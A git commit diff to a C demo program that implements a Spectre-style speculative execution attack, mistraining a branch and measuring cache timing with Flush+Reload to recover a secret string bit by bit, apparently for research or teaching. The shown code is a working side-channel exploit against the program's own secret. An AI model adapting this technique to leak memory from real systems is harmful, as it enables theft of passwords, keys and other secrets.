10446e499b8cda5c10a428a5db0d7ad8a62346af
Cole Strickler <colestrickler@gmail.com>
2024-04-08 17:33:07 -0500

    flush reload demo

--- src/flushreloaddemo/demo_flush_reload.c
+++ src/flushreloaddemo/demo_flush_reload.c
@@ -7,6 +7,8 @@
 #include "../fr.h"
 char buf[4096];
 bool take = true;
+#define THRESHOLD 300
+#define TRAIN_SIZE 3000
 
 
 
@@ -29,7 +31,7 @@ void train()
 {
     char a = 1;
     bool take = true;
-    for (int i = 0; i < 100000; i++)
+    for (int i = 0; i < TRAIN_SIZE; i++)
     {
         flush(&take);
         branch(&a, 0);
@@ -39,7 +41,25 @@ void train()
     flush(&take);
 }
 
-#define THRESHOLD 100
+
+char spectre_read(char* secret, int offset)
+{
+    char c = 0x0;
+    for (int j = 0; j < 8; j++)
+    {
+        train();
+        flush(&buf[0]);
+        branch(secret + offset, j);
+        unsigned long timing;
+        if ((timing = probe_timing(&buf[0])) < THRESHOLD)
+        {
+            c |= (1<<j);
+        }
+    }
+    return c;
+}
+
+
 
 int main(int argc, char** argv)
 {
@@ -54,22 +74,13 @@ int main(int argc, char** argv)
 
     for (int i = 0; i < strlen(secret); i++)
     {
-        char c = 0x0;
-        for (int j = 0; j < 8; j++)
-        {
-            train();
-            flush(&buf[0]);
-            branch(secret + i, j);
-            unsigned long timing;
-            if ((timing = probe_timing(&buf[0])) < THRESHOLD)
-            {
-                c |= (1<<j);
-                printf("Got Hit: %ld\n", timing);
-            }
-            else
-                printf("Miss: %ld\n", timing);
-        }
-        found_secret[i] = c;
+        char c1 = 0x0;
+        char c2 = 0x0;
+        while((c1 = spectre_read(secret, i)) > 150 || c1 < 31);
+
+
+        found_secret[i] = c1;
+        printf("Found Secret: %s\n", found_secret);
     }
     printf("Found Secret: %s\n", found_secret);
 
